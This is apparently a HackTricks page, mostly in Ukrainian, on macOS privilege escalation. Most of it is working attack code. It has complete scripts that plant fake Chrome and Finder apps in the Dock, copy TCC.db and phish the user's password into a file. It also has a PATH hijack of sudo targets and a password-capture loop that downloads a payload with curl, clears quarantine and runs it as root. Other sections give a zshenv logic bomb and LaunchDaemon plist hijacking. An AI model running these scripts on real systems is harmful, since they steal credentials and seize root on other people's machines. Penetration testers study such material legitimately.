# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Якщо ви прийшли сюди в пошуках TCC privilege escalation, перейдіть до:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Зверніть увагу, що **більшість трюків щодо privilege escalation, які впливають на Linux/Unix, також вплинуть на MacOS** машини. Тож дивіться:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Взаємодія з користувачем

### Sudo Hijacking

Оригінальну [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) можна знайти тут.

Однак macOS **зберігає** користувацький **`PATH`** при виконанні **`sudo`**. Це означає, що інший спосіб реалізувати цю атаку — **hijack other binaries**, які жертва буде виконувати під час **запуску `sudo`:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Зверніть увагу, що користувач, який використовує термінал, з великою ймовірністю матиме встановлений **Homebrew**. Тому можливо перехопити бінарні файли в **`/opt/homebrew/bin`**.

### Підміна Dock

Використовуючи деяку **social engineering**, ви можете, наприклад, **імітувати Google Chrome** в Dock і фактично виконати свій власний скрипт:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Декілька порад:

- Перевірте в Dock, чи є там Chrome, і в такому випадку **видаліть** цей запис і **додайте** **фальшивий** **запис Chrome на ту саму позицію** в масиві Dock.

<details>
<summary>Скрипт підміни Chrome в Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Декілька порад:

- Ви **не можете видалити Finder з Dock**, тож якщо ви збираєтеся додати його до Dock, ви можете розмістити підроблений Finder поруч із реальним. Для цього потрібно **додати запис підробленого Finder на початок масиву Dock**.
- Інший варіант — не поміщати його в Dock, а просто відкрити; "Finder asking to control Finder" не виглядає надто дивно.
- Ще один спосіб, щоб **ескалувати до root без запиту** пароля через огидний діалог — змусити Finder справді запросити пароль для виконання привілейованої дії:
- Попросіть Finder скопіювати до **`/etc/pam.d`** новий файл **`sudo`** (у підказці про введення пароля буде вказано "Finder wants to copy sudo")
- Попросіть Finder скопіювати новий **Authorization Plugin** (ви можете контролювати ім'я файлу, тож у підказці про введення пароля буде вказано "Finder wants to copy Finder.bundle")

<details>
<summary>Скрипт підробки Finder у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Шкідливе ПЗ часто експлуатує взаємодію з користувачем, щоб **перехопити пароль, придатний для sudo**, і повторно використовувати його програмно. Типова послідовність:

1. Визначте залогіненого користувача за допомогою `whoami`.
2. **Повторювати запити пароля** доки `dscl . -authonly "$user" "$pw"` не поверне успіх.
3. Кешувати облікові дані (наприклад, `/tmp/.pass`) і виконувати привілейовані дії з `sudo -S` (пароль через stdin).

Приклад мінімального ланцюга:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Крадений пароль можна повторно використати, щоб **очистити карантин Gatekeeper за допомогою `xattr -c`**, скопіювати LaunchDaemons або інші привілейовані файли та виконати подальші етапи неінтерактивно.

## Новіші специфічні для macOS вектори (2023–2025)

### Застарілий `AuthorizationExecuteWithPrivileges` все ще працює

`AuthorizationExecuteWithPrivileges` було застаріле в 10.7, але **все ще працює в Sonoma/Sequoia**. Багато комерційних оновлювачів викликають `/usr/libexec/security_authtrampoline` з ненадійним шляхом. Якщо цільовий бінар доступний для запису користувачем, ви можете підсунути trojan і скористатися легітимним запитом:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Поєднайте з **masquerading tricks above**, щоб показати правдоподібне діалогове вікно введення пароля.

### Privileged helper / XPC тріаж

Багато сучасних сторонніх macOS privescs дотримуються тієї ж схеми: **root LaunchDaemon** надає **Mach/XPC service** з **`/Library/PrivilegedHelperTools`**, далі helper або **doesn't validate the client**, перевіряє його **too late** (PID race), або відкриває **root method**, який приймає **user-controlled path/script**. Це клас багів, що стоїть за багатьма нещодавніми помилками helper у VPN clients, game launchers і updaters.

Швидкий чеклист для тріажу:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Pay special attention to helpers that:

- продовжують приймати запити **після видалення** тому, що job залишився завантаженим у `launchd`
- виконують скрипти або читають конфігурацію з **`/Applications/...`** або інших шляхів, доступних для запису не-root користувачам
- покладаються на **PID-based** або **bundle-id-only** перевірку peer, яка може бути піддана race condition

For more details on helper authorization bugs check [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Until Apple fixed it in **Sonoma 14.5**, **Ventura 13.6.7** and **Monterey 12.7.5**, user-initiated installs via **`Installer.app`** / **`PackageKit.framework`** could execute **PKG scripts as root inside the current user's environment**. That means a package using **`#!/bin/zsh`** would load the attacker's **`~/.zshenv`** and run it as **root** when the victim installed the package.

This is especially interesting as a **logic bomb**: you only need a foothold in the user's account and a writable shell startup file, then you wait for any vulnerable **zsh-based** installer to be executed by the user. This does **not** generally apply to **MDM/Munki** deployments because those run inside the root user's environment.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Якщо ви хочете детальніше ознайомитися зі зловживаннями, специфічними для інсталяторів, також перегляньте [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Якщо LaunchDaemon plist або його ціль `ProgramArguments` є **user-writable**, ви можете escalate, замінивши його й змусивши launchd перезавантажитися:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Це віддзеркалює шаблон експлойту, опублікований для **CVE-2025-24085**, де plist, доступний для запису, було зловжито для виконання attacker code з правами root.

### XNU SMR credential race (CVE-2025-24118)

Гонка в **`kauth_cred_proc_update`** дозволяє локальному атакуючому пошкодити вказівник облікових даних лише для читання (`proc_ro.p_ucred`) шляхом змагання циклів `setgid()`/`getgid()` між потоками, доки не відбудеться torn `memcpy`. Успішне пошкодження дає **uid 0** і kernel memory access. Мінімальна структура PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Поєднуйте з heap grooming, щоб розмістити контрольовані дані там, де вказівник повторно читається. На вразливих збірках це надійний **local kernel privesc** без потреби в SIP bypass.

### SIP bypass через Migration Assistant ("Migraine", CVE-2023-32369)

Якщо у вас вже є root, SIP все ще блокує запис у системні місця. Помилка **Migraine** зловживає Migration Assistant entitlement `com.apple.rootless.install.heritable`, щоб породити дочірній процес, який успадковує SIP bypass і перезаписує захищені шляхи (e.g., `/System/Library/LaunchDaemons`). Ланцюжок:

1. Отримати root на живій системі.
2. Запустити `systemmigrationd` із підробленим станом, щоб виконати бінарний файл під контролем атакуючого.
3. Використати успадковане право для патчу файлів, захищених SIP, зберігаючи зміни навіть після перезавантаження.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Кілька демонов Apple приймають **NSPredicate** об'єкти через XPC і перевіряють лише поле `expressionType`, яке контролюється атакуючим. Створивши predicate, що оцінює довільні селектори, можна досягти **code execution in root/system XPC services** (наприклад, `coreduetd`, `contextstored`). У поєднанні з початковим app sandbox escape це надає **privilege escalation without user prompts**. Шукайте XPC endpoints, що десеріалізують predicates і не мають надійного visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (навіть непривілейовані) може створити та змонтувати знімок Time Machine і отримати доступ до ВСІХ файлів цього знімка.\
Єдина **привілегія**, яка потрібна — щоб застосунок, який використовується (наприклад, `Terminal`), мав **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), що має бути надано адміністратором.

<details>
<summary>Змонтувати знімок Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Детальніше пояснення можна знайти [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Чутлива інформація

Це може бути корисним для підвищення привілеїв:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Посилання

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
